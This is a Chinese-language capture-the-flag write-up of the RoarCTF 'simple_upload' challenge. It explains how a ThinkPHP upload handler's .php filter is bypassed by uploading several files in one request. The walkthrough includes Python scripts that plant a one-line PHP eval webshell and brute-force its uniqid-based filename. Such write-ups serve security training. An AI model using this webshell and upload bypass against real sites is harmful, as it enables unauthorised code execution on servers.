RoarCTF-simple_upload
==========

* tip：该题目在BUUCTF的题库里有环境复现：https://buuoj.cn

题目描述
-----

打开题目链接之后，看到如下代码<br>
```php
 <?php
namespace Home\Controller;
use Think\Controller;
class IndexController extends Controller
{
    public function index()
    {
        show_source(__FILE__);
    }
    public function upload()
    {
        $uploadFile = $_FILES['file'] ;
        
        if (strstr(strtolower($uploadFile['name']), ".php") ) {
            return false;
        }
        
        $upload = new \Think\Upload();// 实例化上传类
        $upload->maxSize  = 4096 ;// 设置附件上传大小
        $upload->allowExts  = array('jpg', 'gif', 'png', 'jpeg');// 设置附件上传类型
        $upload->rootPath = './Public/Uploads/';// 设置附件上传目录
        $upload->savePath = '';// 设置附件上传子目录
        $info = $upload->upload() ;
        if(!$info) {// 上传错误提示错误信息
          $this->error($upload->getError());
          return;
        }else{// 上传成功 获取上传文件信息
          $url = __ROOT__.substr($upload->rootPath,1).$info['file']['savepath'].$info['file']['savename'] ;
          echo json_encode(array("url"=>$url,"success"=>1));
        }
    }
} 
```
可以发现，该站是`ThinkPHP`写的一个文件上传网站。<br>

题目分析
-------

* 1、分析代码可知，该站可以通过`POST`方法实现上传文件功能，但是从第14行代码发现php后缀的文件被禁止上传，因此我们需要想办法绕过限制，上传`php小马`。<br><br>
* 2、该脚本通过`allowExts`方法设置上传类型，但是查阅资料得知这种使用方法是不对的，并不能限制上传的文件类型。<br><br>
* 3、upload()函数不传参时为多文件上传，整个`$_FILES`数组的文件都会上传保存，可以利用该属性通过一次访问上传多个文件。<br><br>
结合以上分析得知的内容可知，可以利用`$_FILES`数组上传多个文件来绕过对php的过滤。<br><br>

解题过程
-------

### 1、测试上传功能

首先编写python脚本向网站POST一个非php的文件，这里上传了一个`txt`文件，测试能否正常上传文件，下面是上传测试代码段：<br>
```python
url = "http://c85e5a48-c5f8-4a5b-9a30-6a81677fd75e.node3.buuoj.cn"
path = url + "/index.php/home/index/upload"
files = {"file":("ma.txt",'hello')}
r = requests.post(path, files=files)
print(r.text)
```
回显内容如下:<br>
```
{"url":"\/Public\/Uploads\/2019-10-24\/5db1841fb439d.txt","success":1}
```
能够成功上传文件。<br>
### 2、测试上传php文件：

```python
url = "http://c85e5a48-c5f8-4a5b-9a30-6a81677fd75e.node3.buuoj.cn"
path = url + "/index.php/home/index/upload"
files = {"file":("ma.txt",'hello'), "file1":("ma.php", '<?php eval($_GET["cmd"]);')}
r = requests.post(path, files=files)
```
回显内容如下：<br>
```
{"url":"\/Public\/Uploads\/2019-10-24\/5db18420027a3.txt","success":1}
{"url":"\/Public\/Uploads\/","success":1}
```
由回显可知，我们成功上传了php文件,但是并没有回显php的文件名<br>
* 其实在比赛做赛题的时候发现，直接上传php文件也是可以成功的，只不过也不会回显文件名。<br><br>
通过多次上传发现规律：新文件名是以`微秒`为单位转`十六进制`的字符串（后来在WP中了解到ThinkPHP中，文件名是通过`uniqid`函数生成的，`uniqid`函数是基于以微秒计的当前时间计算的）<br><br>
因此找到php的文件名，理论上就可以成功连接到我们上传的小马，而方法只有一个，那就是`爆破`。<br>

### 3、爆破php文件名

爆破代码如下：<br>
```python
import requests

url = "http://c85e5a48-c5f8-4a5b-9a30-6a81677fd75e.node3.buuoj.cn"
path = url + "/index.php/home/index/upload"
files = {"file":("ma.txt",'hello'), "file1":("ma.php", '<?php eval($_GET["cmd"]);')}
r = requests.post(path, files=files)
t1 = r.text.split("/")[-1].split(".")[0]
print (t1)

s = "1234567890abcdef"
for i in s:
    for j in s:
        for k in s:
            path = url + "/Public/Uploads/2019-10-24/" + t1[:-3] + "%s%s%s.php" % (i, j, k)
            r = requests.get(path, timeout=1)
            print(path)
            if r.status_code != 404:
                print(path)
                # print(r.text)
                break
```
由于我们是利用`$_FILES`数组的属性实现一次访问，上传两个文件，因此中间相隔的时间较短，利用以上单线程的爆破即可拿到php的文件名，然后常规操作连接小马拿flag。<br><br>
这里还有另一种方法是利用BP进行爆破，只需爆破文件名的后三个字符即可，其实原理是一样的，只是工具不同而已。<br>

但是在BUUCTF的站上使用BP爆破时会回显`429 Too Many Requests (太多请求)`,同样如果用自己的多线程代码去爆破也会遇到这个问题，是网站为了限制客户端的请求数量的配置，没办法，只能用单线程。<br>

思考总结
-------

在比赛的时候，由于不了解代码中一次访问可以上传多个文件的漏洞，便采用了上传三次文件的方法（第一次上传txt，第二次传php小马，第三次再传txt，以此得到命名范围），这就导致第一次和第三次拿到的文件名范围比较广，爆破困难，当时自己写了个蹩脚的多线程，最终也没能成功爆破出文件名...<br>
赛后看了几个WP关键步骤还是在于爆破文件名，我采用的这种方法也有人成功拿到了flag...不过正解应该还是利用漏洞一次上传多个文件来爆破吧。
